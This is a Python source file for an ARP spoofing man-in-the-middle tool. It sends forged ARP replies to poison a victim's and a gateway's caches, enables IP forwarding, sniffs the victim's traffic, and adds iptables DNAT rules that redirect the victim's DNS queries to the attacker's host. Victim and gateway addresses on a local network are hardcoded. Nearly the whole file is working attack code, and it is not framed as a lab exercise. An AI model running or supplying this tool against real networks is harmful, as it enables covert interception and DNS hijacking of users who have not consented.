import socket
import signal
import sys
import time
import os
import threading
import os
from random import randint
from struct import pack
from uuid import getnode as get_mac
from ARP import ARP, parse_ip, parse_mac
from scapy.all import sniff, IP, DNS, UDP, send, DNSRR

class ARPSpoof:
	def __init__(self, target1, target2, interface):
		self.target1 = target1
		self.target2 = target2
		self.interface = interface
		self.my_mac = get_mac()
		self.sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.SOCK_RAW)
		self.sock.bind((self.interface, socket.SOCK_RAW))

	def request(self, ipsrc,ipdst,hwsrc, hwdest):
		arpreq = ARP(0x0001,self.my_mac, hwsrc, hwdest, ipsrc, ipdst).arp_packet
		self.sock.send(''.join(arpreq))

	def response(self, ipsrc,ipdst,hwsrc, hwdest):
		arpres = ARP(0x0002,self.my_mac, hwsrc, hwdest, ipsrc, ipdst).arp_packet
		self.sock.send(''.join(arpres))

	def arp(self, victim1_mac = None, victim2_mac = None):
		if victim1_mac is None:
			# to be implemented
			pass
		if victim2_mac is None:
			# to be implemented
			pass
		# victim1_mac = parse_mac(victim1_mac)
		# victim2_mac = parse_mac(victim2_mac)
		self.response(self.target1, self.target2, self.my_mac, victim2_mac)
		self.response(self.target2, self.target1, self.my_mac, victim1_mac)

	def rearp(self, victim1_mac = None, victim2_mac = None):
		if victim1_mac is None:
			# to be implemented
			pass
		if victim2_mac is None:
			# to be implemented
			pass
		# victim1_mac = parse_mac(victim1_mac)
		# victim2_mac = parse_mac(victim2_mac)
		self.response(self.target1, self.target2, victim1_mac, victim2_mac)
		self.response(self.target2, self.target1, victim2_mac, victim1_mac)


CHECK = False

def id_generator():
	return ''.join([chr(randint(97, 122)) for i in xrange(6)])


def stopper_check(x):
	global CHECK
	return CHECK

def action(pkt):
	# fd.write(pkt)	
	# print
	# pass
	# if pkt.haslayer(DNS):
		# print pkt[DNS].qd.qname'
	print pkt

def my_sniff(address, interface):
	global CHECK
	# ftr = "ip and host "+address 
	# print IP
	# fd = open("output", "w")
	ftr = "ip and host " + address
	# print ftr
	sniff(iface=interface, filter=ftr, prn=action, stop_filter=stopper_check)


# ip in strings, mac in number
def main(victim_ip, victim_mac,target_ip, target_mac, my_ip ,interface, dns=(),DNS=False,forward=True):
	if DNS:
		ipt_cmd = "sudo iptables -t nat -A PREROUTING -d %s -p udp --dport 53 -j DNAT --to %s:53"
		for d in dns:
			fcmd = ipt_cmd % (d, my_ip)
			print fcmd
			os.system(fcmd)
	if forward:
		os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

	t = threading.Thread(target=my_sniff, args=(victim_ip,interface))
	t.start()
	arsp = ARPSpoof(victim_ip, target_ip, interface)
	def signal_handler(signal, frame):
		global CHECK
		CHECK = True
		c = 0
		while c<10:
			arsp.rearp(victim_mac , target_mac)
			arsp.rearp(victim_mac , target_mac)
			time.sleep(1)
			c+=1
		if forward:
			os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
		arsp.sock.close()
		print "[*] Exiting!"
		if DNS:
			ipt_cmd = "sudo iptables -t nat -D PREROUTING -d %s -p udp --dport 53 -j DNAT --to %s:53"
			for d in dns:
				fcmd = ipt_cmd % (d, my_ip)
				os.system(fcmd)
		t.join()
		sys.exit(0)
	signal.signal(signal.SIGINT, signal_handler)
	# t = threading.Thread(target=)
	while True:
		arsp.arp(victim_mac , target_mac)
		time.sleep(1)

if __name__=="__main__":
	# os.system("sudo iptables -t nat -A PREROUTING -d 192.168.121.12 -p udp --dport 53 -j DNAT --to 172.25.12.170:53")
	# os.system("sudo iptables -t nat -A PREROUTING -d 192.168.121.14 -p udp --dport 53 -j DNAT --to 172.25.12.170:53")
	# t = threading.Thread(target=my_sniff, args=("172.25.12.87","enp3s0"))
	# t.start()
	# os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
	# arsp = ARPSpoof('172.25.12.87', '172.25.12.1', 'enp3s0')
	# def signal_handler(signal, frame):
	# 	global CHECK
	# 	CHECK = True
	# 	c = 0
	# 	while c<10:
	# 		arsp.rearp(22371680195093 , 132879549407295)
	# 		arsp.rearp(22371680195093 , 132879549407295)
	# 		time.sleep(1)
	# 		c+=1
	# 	os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
	# 	arsp.sock.close()
	# 	print "[*] Exiting!"
	# 	os.system("sudo iptables -t nat -D PREROUTING -d 192.168.121.12 -p udp --dport 53 -j DNAT --to 172.25.12.170:53")
	# 	os.system("sudo iptables -t nat -D PREROUTING -d 192.168.121.14 -p udp --dport 53 -j DNAT --to 172.25.12.170:53")
	# 	t.join()
	# 	sys.exit(0)
	# signal.signal(signal.SIGINT, signal_handler)
	# # t = threading.Thread(target=)
	# while True:
	# 	arsp.arp(22371680195093 , 132879549407295)
	# 	time.sleep(1)
	main("172.25.12.12", 128120927149033, "172.25.12.1", 132879549407295, "172.25.12.170", "enp3s0", ("192.168.121.12", "192.168.121.14"), True)